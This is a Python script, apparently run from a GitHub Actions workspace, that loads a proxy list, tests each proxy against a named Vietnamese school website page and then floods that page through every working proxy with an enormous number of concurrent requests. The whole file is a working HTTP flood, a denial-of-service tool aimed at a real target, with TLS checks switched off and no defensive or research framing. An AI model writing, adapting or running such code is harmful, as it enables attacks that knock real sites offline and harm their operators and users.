import asyncio
import aiohttp
import os

# ================== CONFIG ==================
INPUT_FILE = "/home/runner/work/susygrass/susygrass/alive1.txt"
OUTPUT_FILE = "/home/runner/work/susygrass/susygrass/alive1.txt"  
TARGET_URL = "https://c3phucu.hungyen.edu.vn/tin-tuc/thoi-khoa-bieu-so-1-ca-chieu.html"
TIMEOUT = 50
CONNECTIONS_PER_PROXY = 100000000000   # hammer requests if proxy works
MAX_CONCURRENT = 5000
# ============================================


def make_proxy_url(proxy: str) -> str:
    proxy = proxy.strip()
    if proxy.startswith(("http://", "https://", "socks")):
        return proxy
    return f"http://{proxy}"


async def hammer_proxy(session: aiohttp.ClientSession, proxy: str):
    """Hammer a working proxy many times"""
    tasks = [session.get(TARGET_URL, proxy=make_proxy_url(proxy), timeout=TIMEOUT, ssl=False)
             for _ in range(CONNECTIONS_PER_PROXY)]
    for task in asyncio.as_completed(tasks):
        try:
            resp = await task
            print(f"[+] EXTRA HIT via {proxy} ({resp.status})")
            resp.release()
        except Exception as e:
            print(f"[!] Hammer failed via {proxy} ({type(e).__name__})")


async def check_or_retry(session: aiohttp.ClientSession, proxy: str) -> str | None:
    """Check once, if works hammer; if fails, retry until it works or give up"""
    try:
        async with session.get(TARGET_URL, proxy=make_proxy_url(proxy), timeout=TIMEOUT, ssl=False) as resp:
            if resp.status == 200:
                print(f"[+] WORKING: {proxy}")
                await hammer_proxy(session, proxy)
                return proxy
            else:
                print(f"[-] DEAD: {proxy} (status {resp.status})")
    except Exception as e:
        print(f"[-] DEAD: {proxy} ({type(e).__name__})")

    # Retry loop for dead ones
    for attempt in range(3):  # retry a few times
        try:
            async with session.get(TARGET_URL, proxy=make_proxy_url(proxy), timeout=TIMEOUT, ssl=False) as resp:
                if resp.status == 200:
                    print(f"[+] WORKING after retry {attempt+1}: {proxy}")
                    await hammer_proxy(session, proxy)
                    return proxy
        except Exception as e:
            print(f"[-] Retry {attempt+1} failed for {proxy} ({type(e).__name__})")
    return None


async def main():
    if not os.path.exists(INPUT_FILE):
        print(f"[!] Proxy file not found: {INPUT_FILE}")
        return

    with open(INPUT_FILE, "r", encoding="utf-8") as f:
        proxies = [line.strip() for line in f if line.strip()]

    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [check_or_retry(session, proxy) for proxy in proxies]
        results = await asyncio.gather(*tasks)
        alive = [p for p in results if p]

    # Save alive proxies
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(alive))

    print(f"\n[!] {len(alive)} alive proxies saved to {OUTPUT_FILE}")


if __name__ == "__main__":
    asyncio.run(main())
